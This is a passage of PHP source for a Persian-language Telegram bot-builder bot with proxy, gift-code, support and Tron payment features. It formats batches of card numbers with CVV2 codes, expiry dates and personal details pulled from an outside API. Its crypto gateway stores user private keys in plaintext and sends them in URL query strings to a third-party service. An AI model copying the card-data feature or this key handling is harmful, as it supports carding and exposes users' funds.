  $City6 = $Visa["Result"]["6"]["City"];
  $State6 = $Visa["Result"]["6"]["State"];
  $Postalcode6 = $Visa["Result"]["6"]["Postalcode"];
  $Country6 = $Visa["Result"]["6"]["Country"];
  $birthday6 = $Visa["Result"]["6"]["birthday"];
  $cardtype6 = $Visa["Result"]["6"]["cardtype"];
  $cardnumber6 = $Visa["Result"]["6"]["cardnumber"];
 $CVV26 = $Visa["Result"]["6"]["CVV2"];
 $Expirationdate6 = $Visa["Result"]["6"]["Expirationdate"];
 bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
📍name : `$name`
📮 lastname : `$lastname`
 🏘 Address : `$Address`
🌆 City : `$City`
👀 State : `$State`
♨️ Postalcode : `$Postalcode`
?? Country : `$Country`
🎉 Birthday : `$birthday`
🔖 Card Number : `$cardnumber`
🔐 CVV2 : `$CVV2`
🔑 Expirationdate : `$Expirationdate`
👾Card Type : `$cardtype`
 -------------------------------------------------
 📍name : `$name1`
📮 lastname : `$lastname1`
 🏘 Address : `$Address1`
🌆 City : `$City1`
👀 State : `$State1`
♨️ Postalcode : `$Postalcode1`
🚩 Country : `$Country1`
🎉 Birthday : `$birthday1`
🔖 Card Number : `$cardnumber1`
🔐 CVV2 : `$CVV21`
🔑 Expirationdate : `$Expirationdate1`
👾Card Type : `$cardtype1`
 -------------------------------------------------
 📍name : `$name2`
📮 lastname : `$lastname2`
 🏘 Address : `$Address2`
🌆 City : `$City2`
👀 State : `$State2`
♨️ Postalcode : `$Postalcode2`
🚩 Country : `$Country2`
🎉 Birthday : `$birthday2`
🔖 Card Number : `$cardnumber2`
🔐 CVV2 : `$CVV22`
🔑 Expirationdate : `$Expirationdate2`
👾Card Type : `$cardtype2`
 -------------------------------------------------
 📍name : `$name3`
📮 lastname : `$lastname3`
 🏘 Address : `$Address3`
🌆 City : `$City3`
👀 State : `$State3`
♨️ Postalcode : `$Postalcode3`
🚩 Country : `$Country3`
🎉 Birthday : `$birthday3`
🔖 Card Number : `$cardnumber3`
🔐 CVV2 : `$CVV23`
🔑 Expirationdate : `$Expirationdate3`
👾Card Type : `$cardtype3`
 -------------------------------------------------
 📍name : `$name4`
📮 lastname : `$lastname4`
 🏘 Address : `$Address4`
🌆 City : `$City4`
👀 State : `$State4`
♨️ Postalcode : `$Postalcode4`
🚩 Country : `$Country4`
🎉 Birthday : `$birthday4`
🔖 Card Number : `$cardnumber4`
🔐 CVV2 : `$CVV24`
🔑 Expirationdate : `$Expirationdate4`
👾Card Type : `$cardtype4`
 -------------------------------------------------
 📍name : `$name5`
📮 lastname : `$lastname5`
 🏘 Address : `$Address5`
🌆 City : `$City5`
👀 State : `$State5`
♨️ Postalcode : `$Postalcode5`
🚩 Country : `$Country5`
🎉 Birthday : `$birthday5`
🔖 Card Number : `$cardnumber5`
🔐 CVV2 : `$CVV25`
🔑 Expirationdate : `$Expirationdate5`
👾Card Type : `$cardtype5`
 -------------------------------------------------
 📍name : `$name6`
📮 lastname : `$lastname6`
 🏘 Address : `$Address6`
🌆 City : `$City6`
👀 State : `$State6`
♨️ Postalcode : `$Postalcode6`
🚩 Country : `$Country6`
🎉 Birthday : `$birthday6`
🔖 Card Number : `$cardnumber6`
🔐 CVV2 : `$CVV26`
🔑 Expirationdate : `$Expirationdate6`
👾Card Type : `$cardtype6`
 -------------------------------------------------
",
'parse_mode'=>'MarkDown',
]);
}

if($text1 == "📊"){ 
$namayeshamar = file_get_contents("dataPaMicK/namayeshamar.txt");
if($namayeshamar == 'on'){
$load = sys_getloadavg();
$mem = memory_get_usage();
$ver = phpversion();    
$Robotss = file_get_contents("dataPaMicK/bots.txt");
$RooBots = explode("\n",$Robotss);
$robots_count = count($RooBots) -1;
$blockl = file_get_contents("dataPaMicK/blocklist.txt");
$blockli = explode("\n",$blockl);
$block_count = count($blockli) -1;
$user = file_get_contents("users.txt");
$member_id = explode("\n",$user);
$member_count = count($member_id) -1;
bot('sendMessage',[ 
'chat_id'=>$chat_id, 
'text'=>"وضعیت رباتساز بزرگ $namebot به شرح زیر میباشد😅🌹", 
'parse_mode'=>'HTML', 
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[ 
    
[['text'=>"online ✅",'callback_data'=>'prooo'],['text'=>"وضعیت ⚜ ⇠",'callback_data'=>'prooo']], 
[['text'=>"「  $member_count 」",'callback_data'=>'prooo'],['text'=>"تعداد اعضا 👥 ⇠",'callback_data'=>'prooo']], 
[['text'=>"「 $robots_count 」",'callback_data'=>'prooo'],['text'=>"تعداد رباتها 🤖 ⇠",'callback_data'=>'prooo']], 
[['text'=>"「 $load[0] ᴍꜱ 」",'callback_data'=>'prooo'],['text'=>"پینگ سرور 🐉 ⇠",'callback_data'=>'prooo']], 
[['text'=>"「 1.52 - ᴍʙ 」",'callback_data'=>'prooo'],['text'=>"مقدار رم مصرفی 🌀 ⇠",'callback_data'=>'prooo']], 
] 
]) 
]); 
}else{
 $load = sys_getloadavg();
$mem = memory_get_usage();
$ver = phpversion();    
bot('sendMessage',[ 
'chat_id'=>$chat_id, 
'text'=>"وضعیت رباتساز بزرگ $namebot به شرح زیر میباشد😅🌹", 
'parse_mode'=>'HTML', 
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[ 
    
[['text'=>"online ✅",'callback_data'=>'prooo'],['text'=>"وضعیت ⚜ ⇠",'callback_data'=>'prooo']], 
[['text'=>"「 $load[0] ᴍꜱ 」",'callback_data'=>'prooo'],['text'=>"پینگ سرور 🐉 ⇠",'callback_data'=>'prooo']], 
[['text'=>"「 1.52 - ᴍʙ 」",'callback_data'=>'prooo'],['text'=>"مقدار رم مصرفی 🌀 ⇠",'callback_data'=>'prooo']], 
] 
]) 
]);   
}}

elseif($text == "🔧 | تنظیمات تلگرام"){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=> "اطلاعات حساب شما 🍫 

⚙ تنظیمات تلگرام : tg://settings
👥 تنظیمات گفتوگو : tg://settings/themes
🎗 نشست ها : tg://settings/devices
👮‍♂️ مخاطبین : tg://calls"
]);
}

elseif($text == "🌐 | پروکسی ویژه"){
$proxy = file_get_contents("https://api.codebazan.ir/mtproto/json/?channel=ProxyMTProto");
 $prox = json_decode($proxy,true);
   $server1 = $prox["Result"][0]["server"];
   $port1 = $prox["Result"][0]["port"];
    $secret1 = $prox["Result"][0]["secret"];
 $server2 = $prox["Result"][1]["server"];
 $port2 = $prox["Result"][1]["port"];
  $secret2 = $prox["Result"][1]["secret"];
  $server3 = $prox["Result"][2]["server"];
 $port3 = $prox["Result"][2]["port"];
  $secret3 = $prox["Result"][2]["secret"];
    $server4 = $prox["Result"][3]["server"];
 $port4 = $prox["Result"][3]["port"];
  $secret4 = $prox["Result"][3]["secret"];
  $server5 = $prox["Result"][4]["server"];
 $port5 = $prox["Result"][4]["port"];
  $secret5 = $prox["Result"][4]["secret"];
   bot('sendmessage',[
    'chat_id'=>$chat_id,
    'text'=>"
🌐 پروکسی 1

https://t.me/proxy?server=$server1&port=$port1&secret=$secret1
➖➖➖➖➖➖➖➖
🌐 پروکسی 2

https://t.me/proxy?server=$server2&port=$port2&secret=$secret2
 ➖➖➖➖➖➖➖➖
🌐 پروکسی 3

https://t.me/proxy?server=$server3&port=$port3&secret=$secret3
➖➖➖➖➖➖➖➖
🌐 پروکسی 4

https://t.me/proxy?server=$server4&port=$port4&secret=$secret4
➖➖➖➖➖➖➖➖
🌐 پروکسی 5

https://t.me/proxy?server=$server5&port=$port5&secret=$secret5
➖➖➖➖➖➖➖➖

🌐 با کلیک بر روی هر پروکسی به راحتی متصل شوید 

",'parse_mode'=>'HTML',
  ]);
}

elseif($text1 == "🚀 | تست سرعت"){
	sendMessage($chat_id,"
تا 2 ثانیه دیگه تست سرعت شروع خواهد شد 🚀
");
sleep(2);
bot('EditMessageText',[
 'chat_id'=>$chat_id,
 'message_id'=>$message_id + 1,
 'text'=>'
🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱
']);
sleep(0.1);
SendMessage($chat_id,"
🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱
🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱
");
sleep(0.1);
SendMessage($chat_id,"
🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱
🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱
🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱
🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱
");
sleep(0.1);
SendMessage($chat_id,"
🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱
🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱
🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱
🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱
🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱
🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱
");
sleep(0.1);
SendMessage($chat_id,"
🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱
🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱
🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱
🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱
🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱
🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱
🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱
🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱
");
sleep(0.1);
SendMessage($chat_id,"
🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱
🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱
🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱
🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱
🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱
🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱
");
sleep(0.1);
SendMessage($chat_id,"
🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱
🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱
🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱
🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱
");
sleep(0.1);
SendMessage($chat_id,"
🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱
🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱
");
sleep(0.1);
SendMessage($chat_id,"
🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱🌱
");
sleep(0.1);
 bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"تست سرعت رباتساز بزرگ $namebot رو دیدی 🚀😁",
]);
}

if($text == "📿 | ذکر امروز"){
$zekr = file_get_contents("http://api.codebazan.ir/zekr/");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
📿 $zekr
"]); }

if($text == "🕌 | حدیث امامان"){
$hadis = file_get_contents("http://api.codebazan.ir/hadis/");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
🕌 $hadis
"]); }

elseif($text1 == '🌝 | فال حافظ'){
 $pic = "http://www.beytoote.com/images/Hafez/".rand(1,149).".gif";
 SendPhoto($chat_id,$pic,"■ با ذکر صلوات و فاحته ای جهت شادی روح 'حافظ شیرازی' فال تان را بخوانید.");
}

if($text1 == "📺 | تلویزیون آنلاین"){ 
bot('sendMessage',[ 
'chat_id'=>$chat_id, 
'text'=>"
پخش آنلاین شبکه های تلویزیونی ایران👇
", 
'parse_mode'=>'HTML', 
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[ 
[['text'=>"شبکه یک 1️⃣",'url'=>'http://www.telewebion.com/#!/live/tv1'],['text'=>"شبکه دو 2️⃣",'url'=>'http://www.telewebion.com/#!/live/tv2 ']],
[['text'=>"شبکه سه 3️⃣",'url'=>'http://www.telewebion.com/#!/live/tv3'],['text'=>"شبکه چهار 4️⃣",'url'=>'http://www.telewebion.com/#!/live/tv4']],
[['text'=>"شبکه آموزش 👨‍🎓",'url'=>'http://www.telewebion.com/#!/live/amouzesh'],['text'=>"شبکه قرآن 📿",'url'=>'http://www.telewebion.com/#!/live/quran']],
[['text'=>"شبکه سلامت 👨‍🔬",'url'=>'http://www.telewebion.com/#!/live/salamat'],['text'=>"شبکه نسیم 🪂",'url'=>'http://www.telewebion.com/#!/live/nasim']],
[['text'=>"شبکه مستند 🐎",'url'=>'http://www.telewebion.com/#!/live/mostanad'],['text'=>"شبکه افق 🏘",'url'=>'http://www.telewebion.com/#!/live/ofogh']],
[['text'=>"شبکه نمایش 📷",'url'=>'http://www.telewebion.com/#!/live/namayesh'],['text'=>"شبکه آی فیلم 📽",'url'=>'http://www.telewebion.com/#!/live/ifilm']],
] 
]) 
]); 
}

if($text == "📎 | پسورد ساز"){
$passwordSaz = file_get_contents("http://api.codebazan.ir/password/?length=12");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
پسورد قدرتمند شما 🔐 : $passwordSaz
"]); }

if ($text == "درگاه پرداخت ترون 💸") {
if (file_exists("dataPaMicK/" . $from_id . "/wallet/wallet.txt") && file_exists("dataPaMicK/" . $from_id . "/wallet/private_key.txt") && file_exists("dataPaMicK/" . $from_id . "/wallet/hex.txt")) {
bot('sendMessage', [
'chat_id' => $from_id,
'text' => "درحال دریافت نرخ ترون...",
'reply_to_message_id' => $message_id,
'parse_mode' => "Markdown",
]);
$get = json_decode(file_get_contents("https://mizban-self.ir/api/price-tron.php"), true);
$fi = $get['TRX'];
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id + 1,
'text'=> "
*💸 نرخ این لحظه ترون $fi تومان میباشد.*
",
'parse_mode' => "Markdown",
]);
$address = file_get_contents("dataPaMicK/$from_id/wallet/wallet.txt");
bot("sendMessage", [
'chat_id' => $chat_id, 
'text' => "♾ لطفاً فقط و فقط میزان ترون مورد نظر خود را به حساب زیر بزنید: 

Wallet: `$address`

ترون خود را به آدرس بالا واریز و سپس بر روی« تایید واریز ترون » کلیک کنید.

⚠️ اخطار! از انتقال کمتر از 3 ترون خودداری کنید، زیرا موجودی از بین می‌رود و غیر قابل برگشت است و در هیچ صورتی به حساب شما بازگشت داده نمی‌شود!",
'parse_mode'=>'Markdown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"تایید واریز ترون"],['text'=>'🔙 | بازگشت‌']],
],
'resize_keyboard'=>true,
])
]);	
file_put_contents("dataPaMicK/$from_id/step.txt","tronsends");
} else {
bot('sendMessage', [
'chat_id' => $from_id,
'text' => "درحال دریافت نرخ ترون...
همچنین شما ولت ندارید در حال ساخت ولت برای شما هستیم",
'reply_to_message_id' => $message_id,
'parse_mode' => "Markdown",
]);
$get = json_decode(file_get_contents("https://mizban-self.ir/api/price-tron.php"), true);
$fi = $get['TRX'];
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id + 1,
'text'=> "
*💸 نرخ این لحظه ترون $fi تومان میباشد.*
",
'parse_mode' => "Markdown",
]);
$wallet_info = json_decode(file_get_contents("https://mizban-self.ir/api/Tron.php?action=makewallet"), true);
$address = $wallet_info['wallet'];
$pk = $wallet_info['private_key'];
$hex = $wallet_info['hex'];

mkdir("dataPaMicK/$from_id/wallet");
file_put_contents("dataPaMicK/$from_id/wallet/wallet.txt", "$address");
file_put_contents("dataPaMicK/$from_id/wallet/private_key.txt", "$pk");
file_put_contents("dataPaMicK/$from_id/wallet/hex.txt", "$hex");

bot("sendMessage", [
'chat_id' => $chat_id, 
'text' => "♾ لطفاً فقط و فقط میزان ترون مورد نظر خود را به حساب زیر بزنید: 

Wallet: `$address`

ترون خود را به آدرس بالا واریز و سپس بر روی« تایید واریز ترون » کلیک کنید.

⚠️ اخطار! از انتقال کمتر از 3 ترون خودداری کنید، زیرا موجودی از بین می‌رود و غیر قابل برگشت است و در هیچ صورتی به حساب شما بازگشت داده نمی‌شود!",
'parse_mode'=>'Markdown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"تایید واریز ترون"],['text'=>'🔙 | بازگشت‌']],
],
'resize_keyboard'=>true,
])
]);	
file_put_contents("dataPaMicK/$from_id/step.txt","tronsends");

}
}

if ($text == "تایید واریز ترون" and $step == "tronsends"){
$messages = bot('sendMessage', [
'chat_id' => $chat_id,
'text' => "درحال بررسی . . .",
'parse_mode' => 'Markdown',
'reply_to_message_id' => $message_id
])->result->message_id;
$address = file_get_contents("dataPaMicK/$from_id/wallet/wallet.txt");
$details = json_decode(file_get_contents("https://api.trongrid.io/v1/accounts/$address/transactions/?only_confirmed=true&only_to=true"), true)['data'];
$link = "https://mizban-self.ir/api/price-tron.php"; // Dast Nazanid

$found_valid_transaction = false; // اضافه کردن متغیر برای چک کردن وجود تراکنش معتبر

foreach ($details as $detail) {
if ($detail['raw_data']['contract'][0]['parameter']['value']['amount'] >= 2 * 1000000) {
$txid = $detail['txID'];
$amount = $detail['raw_data']['contract'][0]['parameter']['value']['amount'] / 1000000;
$t_amount = $amount;
$t_amounts = $t_amount - 1;
$address = file_get_contents("dataPaMicK/$from_id/wallet/wallet.txt");
$hex = file_get_contents("dataPaMicK/$from_id/wallet/hex.txt");
$private_key = file_get_contents("dataPaMicK/$from_id/wallet/private_key.txt");

file_get_contents("https://mizban-self.ir/api/Tron.php?action=send&address=$address&private_key=$private_key&tx_id=$hex&to=TEkMmyzhJBfqd5EQTKPQeaBFLxDTdrCHbm&amount=$t_amounts");

// بررسی وجود فایل چک کرده در صورت وجود تراکنش تکراری رو نشان نده
if (!file_exists("dataPaMicK/" . $from_id . "/allsents/$txid.txt")) {
                $found_valid_transaction = true; // تراکنش معتبر وجود دارد
mkdir("dataPaMicK/$from_id/allsents");
file_put_contents("dataPaMicK/$from_id/allsents/$txid.txt", "$txid");

$payment_detials_in_db = file_get_contents("dataPaMicK/$from_id/allsents/$txid.txt");

$get = json_decode(file_get_contents($link), true);
$fi = $get['TRX'];
$amount_rial = $amount * $fi;
$tarakonesh = $amount_rial / $coinprices;
$coin += $tarakonesh;
file_put_contents("dataPaMicK/$from_id/coin.txt", $coin);

$trons = file_get_contents("admin/trons.txt");
$tronss = $trons + $t_amount;
file_put_contents("admin/trons.txt", "$tronss");
bot('deletemessage', [
'chat_id' => $chat_id,
'message_id' => $messages
]);
bot('sendMessage', [
'chat_id' => $chat_id,
'text' => "
✅ - #تراکنش_موفق
🎉 - تبریک تراکنش شما در شبکه شناسایی شد
💸 - مقدار ترون ارسالی : $t_amount
🎁 - شما مقدار $tarakonesh سکه دریافت کردید 
",
'parse_mode' => 'HTML',
]);
bot('sendMessage', [
'chat_id' => $Dev,
'text' => "
✅ - #تراکنش_موفق - #واریز_جدید
👤 - ایدی عددی شخص : $from_id
🎉 - تراکنش جدیدی در شبکه شناسایی شد
💸 - مقدار ترون ارسالی : $t_amount

⚠️ - برای کسب اطلاعات بیشتر به پنل مدیریت بخش کسب در آمد مراجعه کنید
",
'parse_mode' => 'HTML',
]);
}
}
}

if (!$found_valid_transaction) {
bot('deletemessage', [
'chat_id' => $chat_id,
'message_id' => $messages
]);
bot('sendMessage', [
'chat_id' => $chat_id,
'text' => "❌ تراکنشی در شبکه تشخیص داده نشد! لطفا 5 دقیقه ی دیگر امتحان کنید!",
'parse_mode' => 'HTML',
]);
}
}

if($text1 == "پرداخت آفلاین 🖥"){ 
bot('sendMessage',[ 
'chat_id'=>$chat_id, 
'text'=>"
$buuuyyycoinn", 
'parse_mode'=>'HTML', 
]); 
}

if($text1 == "🛍 | خرید امتیاز"){ 
bot('sendMessage',[ 
'chat_id'=>$chat_id, 
'text'=>"
یکی از راه های پرداختی رو انتخاب کن", 
'parse_mode'=>'Markdown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"پرداخت آفلاین 🖥"],['text'=>'درگاه پرداخت ترون 💸']],
[['text'=>'🔙 | بازگشت‌']],
],
'resize_keyboard'=>true,
])
]);	
}


elseif($text == '👤 | زیرمجموعه گیری'){ 
 $id = bot('sendphoto',[ 
 'chat_id'=>$chat_id, 
 'photo'=>$linkzirmajooo,
 'caption'=>"$textbanerrr

https://t.me/$bot?start=$from_id 
", 
      ])->result->message_id; 
    bot('sendmessage',[ 
 'chat_id'=>$chat_id, 
 'text'=>"
بنر بالا را برای دوستان و مخاطبین خود ارسال کنید و به ازای هر شخصی که با لینک شما وارد میشود « $emtiazzzirmod امتـیـاز » دریافت کنید 🎁", 
 'reply_to_message_id'=>$message_id, 
      ]); 
}

if($text1 == "/profile" or $text1 == "✏️ | حساب کاربری"){ 
bot('sendMessage',[ 
'chat_id'=>$chat_id, 
'text'=>"
📍اطلاعات کاربری شما به شرح زیر میباشد
", 
'parse_mode'=>'HTML', 
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[ 
[['text'=>"$first_name",'callback_data'=>'prooo'],['text'=>"نام 📄",'callback_data'=>'prooo']], 
[['text'=>"@$username",'callback_data'=>'prooo'],['text'=>"یوزرنیم 🌀",'callback_data'=>'prooo']], 
[['text'=>"$chat_id",'callback_data'=>'prooo'],['text'=>"ایدی عددی 🔢",'callback_data'=>'prooo']], 
[['text'=>"$sea",'callback_data'=>'prooo'],['text'=>"زیرمجموعه ها 🫂",'callback_data'=>'prooo']], 
[['text'=>"$coin",'callback_data'=>'prooo'],['text'=>"امتیاز ها 💰",'callback_data'=>'prooo']], 
[['text'=>"$warn",'callback_data'=>'prooo'],['text'=>"اخطار ها ⚠️",'callback_data'=>'prooo']], 
[['text'=>"➖➖➖➖➖➖➖➖➖",'callback_data'=>'prooo']], 
[['text'=>"$zaman",'callback_data'=>'prooo'],['text'=>"زمان ورود ⏰",'callback_data'=>'prooo']], 
[['text'=>"$bta",'callback_data'=>'prooo'],['text'=>"تاریخ ورود 🗓",'callback_data'=>'prooo']], 
] 
]) 
]); 
}
//====================//
elseif($text1 =="☎️"){
$reree=file_get_contents("dataPaMicK/poshtibannn.txt");
if($reree=='on'){
file_put_contents("dataPaMicK/$from_id/state.txt","mokk");
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
📝  - متن پیام خود را در قالب یک پیام ارسال کنید
",
'parse_mode'=>'HTML',
'reply_markup'=>json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"🔙 | بازگشت‌"]],
]
])
]);
}else{
 bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"بخش پشتیبانی ربات خاموش میباشد .",
'parse_mode'=>'HTML',
'reply_markup'=>json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"🔙 بازگشت️"]],
]
])
]);
}
}
elseif($state == "mokk" && $text !="🔙 | بازگشت‌" ){
bot('ForwardMessage',[
'chat_id'=>$Dev,
'from_chat_id'=>$from_id,
'message_id'=>$message_id
]);
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"پیام شما با موفقیت ارسال شد ✅",
]);
bot('sendMessage',[
'chat_id'=>$Dev,
'text'=>"
🔱 پیام جدیدی ارسال شد

🔢 آیدی عددی ارسال کننده : $from_id
 ⏰ ساعت : $time
🗓️ تاریخ : $ambar
",
'parse_mode'=>'HTML',
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>'پیام به کاربر📭']],
[['text'=>"🔙 | بازگشت‌"]],
],
'resize_keyboard'=>true,
])
]);
file_put_contents("dataPaMicK/$from_id/state.txt","none");
}
//
if(strpos($text,"}") !== false or strpos($text,"{") !== false or strpos($text,"'") !== false or strpos($text,'"') !== false or strpos($text,")") !== false or strpos($text,"(") !== false ){
    bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"🚨 خطا!",
 ]);
 exit;
}

elseif($text1 == "🎁"){
 file_put_contents('dataPaMicK/'.$from_id."/step.txt","useCode");
 var_dump(bot('sendMessage',[
     'chat_id'=>$update->message->chat->id,
     'text'=>"کد هدیه را وارد کنید.",
     'parse_mode'=>'MarkDown',
     'reply_markup'=>json_encode([
         'keyboard'=>[
             [
                 ['text'=>"🔙 | بازگشت‌"]
             ]
         ],
         'resize_keyboard'=>true
     ])
 ]));
}

elseif($step == "useCode"){
    if(!preg_match('/^[a-zA-Z0-9]+$/',$text)){
        bot('sendMessage', [
            'chat_id' => $chat_id,
            'text' => "کد هدیه نامعتبر است.",
            'parse_mode' => "MarkDown",
        ]);
        exit();
    }
file_put_contents('dataPaMicK/'.$from_id."/step.txt","none");
 if (file_exists("admin/code/$text.txt")) {
  $price = file_get_contents("admin/code/$text.txt");
  if($price == 'true'){
        bot('sendMessage', [
            'chat_id' => $chat_id,
            'text' => "کد هدیه از قبل استفاده شده است.",
            'parse_mode' => "MarkDown",
        ]);
  }else{
$coin = file_get_contents('dataPaMicK/'.$from_id."/coin.txt");
$coinsprice = file_get_contents("admin/coins/$text.txt");
$getcoins = $coin + $coinsprice;
file_put_contents("dataPaMicK/$chat_id/coin.txt",$getcoins);
file_put_contents("admin/code/$text.txt","true");
if(in_array($chat_id,$Dev)){
  var_dump(bot('sendMessage',[
      'chat_id'=>$update->message->chat->id,
      'text'=>"شما برنده $coinsprice سکه شدید. به شما اضافه شد . !",
      'parse_mode'=>'MarkDown',
      'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"🔙 | بازگشت‌"]],
],
'resize_keyboard'=>true
     ])
 ]));
}else{
  var_dump(bot('sendMessage',[
      'chat_id'=>$chat_id,
      'text'=>"شما برنده $coinsprice سکه شدید. به شما اضافه شد . !",
      'parse_mode'=>'MarkDown',
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"🔙 | بازگشت‌"]],
],
'resize_keyboard'=>true
     ])
 ]));
}
  var_dump(bot('sendMessage',[
'chat_id'=> $channel_log, 
'text'=>"کد با موفقیت استفاده شد ✅", 
'parse_mode'=>'HTML', 
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[ 
[['text'=>"﴾ $first_name ﴿",'callback_data'=>'prooo'],['text'=>"👤 توسط :",'callback_data'=>'prooo']], 
[['text'=>"﴾ @$username ﴿",'callback_data'=>'prooo'],['text'=>"🆔 یوزرنیم :",'callback_data'=>'prooo']], 
[['text'=>"﴾ $from_id ﴿",'callback_data'=>'prooo'],['text'=>"🌐 آیدی عددی  :",'callback_data'=>'prooo']], 
] 
]) 
])); 
  }
 }else{
  file_put_contents('dataPaMicK/'.$from_id."/com.txt","none");
 bot('sendMessage',[
 'chat_id'=>$chat_id,
 'text'=>"کدی که شما وارد کردید وجود ندارد."
 ]);
 }
}
//
elseif($text1 == "📚"){ 
bot('sendMessage',[ 
'chat_id'=>$chat_id, 
'text'=>"$textback", 
'parse_mode'=>'html',
'reply_to_message_id'=>$message_id, 
'reply_markup'=>json_encode([ 
'keyboard'=>[ 
[['text'=>"👾 ساخت ربات در رباتساز $namebot 👾"]],
[['text'=>"ساخت ربات 🤖"],['text'=>"دستورات بات فادر 🤖"]],
[['text'=>"🔙 | بازگشت‌"]],
], 
"resize_keyboard" =>true,
]) 
]);
exit;
}

elseif($text1 == "ساخت ربات 🤖"){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"

📚؛ بـراي سـاخـت ربـات اول بـایـد :

1️⃣~ ربـات @BotFather را اسـتـارت کـنـیـد !

2️⃣~ دسـتـور /newbot را بـه بـات فـادر ارسـال کـنـیـد !

3️⃣~ یـک نـام بـراي ربـات خـودتـان بـه بـات فـادر ارسـال کـنـیـد !

4️⃣~ یـک یـوزرنـیـم بـراي ربـات خـودتـان بـه بـات فـادر ارسـال کـنـیـد !

⚠️~ تـوجـه کـنـیـد کـه آخـر یـوزرنـیـم بـایـد عـبـارت « bot » وجـود داشـتـه بـاشـد !

5️⃣~ اگـر تـمـام مـراحـل را درسـت طـي کـرده بـاشـیـد ، بـات فـادر مـتـن طـولانـي اي بـه عـنـوان تـوکـن بـراي شـمـا ارسـال مـیـکـنـد !

6️⃣~ آن مـتـن طـولانـي کـه تـوکـن نـامـیـده مـیـشـود کـه بـه صـورت :
- - - - - - - - - - - - - - - - - - - - - -
1480433713:AAHKWhWSwkDqIcQGBUIyETquuunbv
- - - - - - - - - - - - - - - - - - - - - -
💐 مـي بـاشـد و هـمـچـنـيـن چـیـزي را در سـاخـت ربـات بـایـد بـه ربـات سـاز $namebot بدهـیـد تـا بـرایـتـان ربـات مـورد نـظـر را بـسـازد !
",
'parse_mode'=>"HTML",  
'reply_to_message_id'=>$message_id, 
]);
}


elseif($text == "👾 ساخت ربات در رباتساز $namebot 👾"){ 
 $id = bot('sendphoto',[ 
 'chat_id'=>$chat_id, 
 'photo'=>"https://t.me/PaMicKGap/26284",
 'caption'=>"
آموزش ساخت ربات در رباتساز $namebot 👾

خوب وقتی که در ربات بات فادر را ساختید سپس وارد ربات ساز بزرگ $namebot بشید و بروی گزینه (⚒ | ساخت ربات) کلیک کرده و سپس ربات مد نظرت خود را انتخاب کنید ✅

بعد درصورتی که ربات از شما اطلاعاتی مانند آیدی چنل جوین اجباری آیدی عددی چنل و . . . خواست وارد کنید و ارسال کنید 👾

سپس در بخش آخر توکن دریافتی خودتون رو در بات فادر را دریافت و در ربات ساز بزرگ $namebot ارسال کنید ✅

تمام ربات شما با موفقیت ساخته شد ⚠️

موفق باشید 🫶
", 
 'reply_to_message_id'=>$message_id, 
  ]); 
}

elseif($text1 == "دستورات بات فادر 🤖"){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
